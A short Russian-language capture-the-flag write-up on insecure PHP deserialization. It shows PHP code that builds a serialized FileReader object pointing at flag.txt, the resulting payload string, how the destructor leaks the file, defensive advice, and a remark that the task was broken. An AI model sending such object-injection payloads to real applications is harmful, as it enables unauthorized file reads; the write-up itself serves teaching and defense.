**Задание:**

Попробуйте сервис для онлайн десериализации данных.  
Флаг записан в файле flag.txt и лежит на одном уровне с index.php.

Адрес: http://31.207.77.216:4015

---
**Решение:**

Имеем дело с небезопасной десериализацией пользовательских данных в PHP.

```php
<?php
class FileReader {
    public $filename = "flag.txt";
}

echo serialize(new FileReader());
?>
```

```text
O:10:"FileReader":1:{s:8:"filename";s:8:"flag.txt";}
```

**Механизм**:

- Пользовательская сериализованная строка создает объект `FileReader`.
- При десериализации устанавливается свойство `filename = "flag.txt"`.
- В конце выполнения скрипта вызывается деструктор `__destruct()`.
- Деструктор читает и выводит содержимое указанного файла.
- Флаг отображается на странице.

**Защита**:

- Не использовать `unserialize()` с пользовательскими данными.
- Использовать `json_decode()` вместо `unserialize()`.
- Валидировать и фильтровать входные данные.
- Использовать белые списки разрешенных классов для десериализации.

Незапланированное решение – оказалось, что таск сломан и для получения флага достаточно сходить на ручку `/flag`.
